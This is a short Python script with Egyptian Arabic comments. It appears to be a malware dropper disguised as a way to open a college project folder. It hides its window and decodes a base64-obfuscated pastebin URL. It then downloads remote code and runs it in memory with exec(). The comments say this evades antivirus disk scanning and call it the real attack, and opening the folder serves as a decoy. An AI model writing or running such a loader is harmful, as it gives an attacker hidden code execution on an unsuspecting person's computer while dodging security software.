import requests
import base64
import time
import subprocess
import os

# إعدادات الصمت التام
si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
si.wShowWindow = 0


def start_attack():
    # رابط الكود التقيل اللي أنت رفعته (مشفر عشان الأنتي فيرس ميعرفش هو بيحمل إيه)
    # استبدل ده برابط الـ Raw بتاعك مشفر Base64
    encoded_url = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3h4eHh4"
    url = base64.b64decode(encoded_url).decode()

    try:
        # تحميل الكود التقيل كنص
        response = requests.get(url, timeout=10)
        payload = response.text

        # التنفيذ المباشر في الذاكرة (Memory Execution)
        # دي الخدعة اللي بتهرب من الـ Static Disk Scanning
        exec(payload, globals())
    except:
        pass


if __name__ == "__main__":
    # التمويه بفتح فولدر المشروع بكرة في الكلية
    if os.path.exists("very Important"):
        os.startfile("very Important")

    # تشغيل الهجوم الحقيقي
    start_attack()
